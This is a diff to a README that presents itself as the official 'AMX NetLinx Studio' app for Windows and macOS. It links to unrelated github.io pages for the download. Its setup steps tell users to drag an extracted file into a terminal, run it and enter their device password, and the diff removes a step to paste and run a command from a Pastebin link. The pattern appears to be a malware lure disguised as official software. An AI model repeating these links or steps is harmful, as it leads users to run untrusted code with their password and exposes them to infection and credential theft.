@@ -9,9 +9,8 @@
 **AMX NetLinx Studio Desktop App** is the official **programming and configuration environment** for AMX NetLinx controllers. Built for **Windows** and **macOS**, it provides AV integrators and developers with the tools to design, test, and deploy professional automation systems for conference rooms, auditoriums, campuses, and enterprise facilities.  
 
 <div align="center">  
-
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://loganahmeddyzm.github.io/.github/amx-netlinx-studio-app)  
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-silver?style=for-the-badge&logo=apple)](https://loganahmeddyzm.github.io/.github/amx-netlinx-studio-app)  
+  
+[![Open AMX NetLinx](https://img.shields.io/badge/Open-AMX%20NetLinx-1D4ED8?style=flat)](https://amx-netlinx.github.io/.github/)
 
 </div>  
 
@@ -34,13 +33,6 @@
 3. Open a terminal and transfer the file you extracted in the last step into it.  
 4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).  
 
-### Setup via a command in the terminal:  
-
-1. Go to the Pastebin at the link below and copy the command:  
-
-https://pastebin.com/raw/ChvELRfj 
-
-2. Open your terminal, paste the command you copied earlier, and run it.  
 
 ---
 
